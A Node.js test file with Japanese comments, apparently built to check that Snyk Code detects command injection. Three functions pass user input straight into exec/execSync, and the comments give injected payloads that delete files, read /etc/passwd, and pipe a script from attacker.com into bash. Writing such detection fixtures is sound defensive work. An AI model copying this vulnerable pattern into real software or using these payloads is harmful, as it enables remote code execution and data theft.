// 検証用：コマンドインジェクションの例
// このファイルは Snyk Code の検出検証専用です。本番利用禁止。
// 危険な理由：ユーザー入力を OS コマンドに直接連結すると、
// 任意のシステムコマンドが実行される（リモートコード実行）。

'use strict';

const { exec, execSync } = require('child_process');

// ❌ 危険：ユーザー入力を exec() に直接渡す
function pingHost(hostname) {
  // 攻撃例: hostname = "google.com; rm -rf /tmp/*"
  exec('ping -c 1 ' + hostname, (err, stdout) => {
    console.log(stdout);
  });
}

// ❌ 危険：ファイル名をそのままシェルコマンドに使用
function convertFile(inputFile, outputFile) {
  // 攻撃例: inputFile = "input.jpg; cat /etc/passwd > /tmp/leak.txt"
  execSync('convert ' + inputFile + ' ' + outputFile);
}

// ❌ 危険：テンプレートリテラルでもコマンドインジェクションは発生する
function compressDirectory(dirName) {
  // 攻撃例: dirName = "mydir && curl attacker.com/shell.sh | bash"
  execSync(`tar -czf archive.tar.gz ${dirName}`);
}

module.exports = { pingHost, convertFile, compressDirectory };
